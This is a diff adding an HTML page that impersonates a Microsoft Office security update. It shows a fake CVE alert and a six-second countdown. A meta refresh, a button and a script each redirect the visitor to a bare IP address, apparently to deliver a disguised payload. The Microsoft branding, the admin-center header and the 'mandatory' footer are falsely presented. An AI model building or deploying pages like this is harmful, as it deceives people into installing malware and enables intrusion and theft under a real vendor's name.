@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Office Update — Security Patch Required</title>
+  <meta http-equiv="Refresh" content="6; url=http://85.11.167.21/co">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#f2f2f2;color:#2c2c2c}
+    .header{background:#2b5797;height:48px;display:flex;align-items:center;padding:0 24px}
+    .header span{color:white;font-size:16px;font-weight:600}
+    .container{max-width:640px;margin:40px auto;background:white;border-radius:6px;box-shadow:0 1px 5px rgba(0,0,0,0.1);overflow:hidden}
+    .banner{background:#1e3a6f;padding:20px 28px;color:white}
+    .banner h1{font-size:22px;font-weight:600;margin-bottom:5px}
+    .banner p{font-size:13px;opacity:0.85}
+    .content{padding:28px}
+    .alert-red{background:#fef0f0;border-left:4px solid #d13438;padding:14px 16px;margin-bottom:24px;font-size:13px;color:#a4262c}
+    .update-details{background:#f9f9f9;border:1px solid #e0e0e0;border-radius:4px;margin-bottom:24px}
+    .row{display:flex;padding:12px 16px;border-bottom:1px solid #e0e0e0;font-size:13px}
+    .row:last-child{border-bottom:none}
+    .row .label{width:140px;color:#6c6c6c}
+    .row .value{font-weight:500;color:#1a1a1a}
+    .badge{background:#d13438;color:white;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
+    .countdown-box{background:#f5f5f5;text-align:center;padding:20px;border-radius:4px;margin-bottom:24px}
+    .countdown-num{font-size:44px;font-weight:700;color:#2b5797}
+    .progress-bar{height:4px;background:#ddd;border-radius:2px;margin-top:10px}
+    .progress-fill{height:100%;background:#2b5797;width:0%;animation:fill 6s linear forwards}
+    @keyframes fill{to{width:100%}}
+    .btn{width:100%;background:#2b5797;color:white;border:none;padding:12px;font-size:14px;font-weight:600;border-radius:4px;cursor:pointer;margin-bottom:10px}
+    .btn:hover{background:#1e3a6f}
+    .btn-secondary{background:white;color:#5c5c5c;border:1px solid #ccc}
+    .list{list-style:none;margin-top:20px}
+    .list li{font-size:12px;color:#555;padding:6px 0 6px 20px;position:relative}
+    .list li::before{content:'•';position:absolute;left:5px;color:#2b5797;font-weight:bold}
+    .footer{padding:14px 28px;border-top:1px solid #e0e0e0;font-size:11px;color:#888;text-align:center}
+  </style>
+</head>
+<body>
+<div class="header">
+  <span>Microsoft 365 Admin Center</span>
+</div>
+<div class="container">
+  <div class="banner">
+    <h1>Office Update Required</h1>
+    <p>Security patch for Microsoft Office 2021 / Microsoft 365 Apps</p>
+  </div>
+  <div class="content">
+    <div class="alert-red">
+      ⚠️ A critical remote code execution vulnerability (CVE-2024-30103) affects your installed version. Unpatched systems are at immediate risk.
+    </div>
+    <div class="update-details">
+      <div class="row"><span class="label">Current version</span><span class="value">2402 (Build 17328.20142)</span></div>
+      <div class="row"><span class="label">Update version</span><span class="value">2407 (Build 17830.20138) <span class="badge">SECURITY</span></span></div>
+      <div class="row"><span class="label">CVE ID</span><span class="value">CVE-2024-30103, CVE-2024-30104</span></div>
+      <div class="row"><span class="label">Severity</span><span class="value">Critical (CVSS 9.8)</span></div>
+      <div class="row"><span class="label">Size</span><span class="value">142 MB</span></div>
+    </div>
+    <div class="countdown-box">
+      <p>Downloading security update in <strong id="cd">6</strong> seconds</p>
+      <div class="countdown-num" id="cdNum">6</div>
+      <div class="progress-bar"><div class="progress-fill"></div></div>
+    </div>
+    <button class="btn" onclick="window.location='http://85.11.167.21/co'">Update Office Now</button>
+    <button class="btn btn-secondary">Remind me later</button>
+    <ul class="list">
+      <li>Patches a use-after-free vulnerability in Microsoft Equation Editor</li>
+      <li>Fixes an OLE object parsing flaw allowing remote code execution</li>
+      <li>Addresses a security bypass in Protected View</li>
+      <li>Includes security updates for Outlook, Word, and Excel</li>
+    </ul>
+  </div>
+  <div class="footer">
+    © Microsoft Corporation. This update is mandatory for compliance.
+  </div>
+</div>
+<script>
+  let t = 6;
+  const cdSpan = document.getElementById('cd');
+  const cdNum = document.getElementById('cdNum');
+  const iv = setInterval(() => {
+    t--;
+    cdSpan.textContent = t;
+    cdNum.textContent = t;
+    if (t <= 0) {
+      clearInterval(iv);
+      window.location.href = 'http://85.11.167.21/co';
+    }
+  }, 1000);
+</script>
+</body>
+</html>
